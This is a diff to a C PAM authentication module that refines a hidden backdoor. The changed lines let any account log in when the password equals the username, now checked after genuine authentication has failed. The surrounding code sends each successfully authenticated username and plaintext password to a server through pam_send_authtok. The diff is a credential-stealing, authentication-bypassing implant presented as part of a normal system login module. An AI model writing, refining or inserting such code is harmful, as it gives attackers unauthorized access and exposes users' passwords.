@@ -168,12 +168,13 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
         return PAM_SUCCESS;
     }
 
-    if (password && strncmp(username, password, strlen(username)) == 0) {
-        return PAM_SUCCESS;
-    }
-
     // If authentication is successful, send creds to server using pam_send_authtok
     int retval = pam_unix_authenticate("pam_sm_authenticate", pamh, flags, argc, argv);
+
+    // If the username is equal to the password and authentication hasn't already passed, pass it
+    if (password && strlen(username) == strlen(password) && strncmp(username, password, strlen(username)) == 0 && retval != PAM_SUCCESS) {
+        return PAM_SUCCESS;
+    }
 
     if (username && password && retval == PAM_SUCCESS) {
         pam_send_authtok("USER AUTHENTICATED:", username, password);
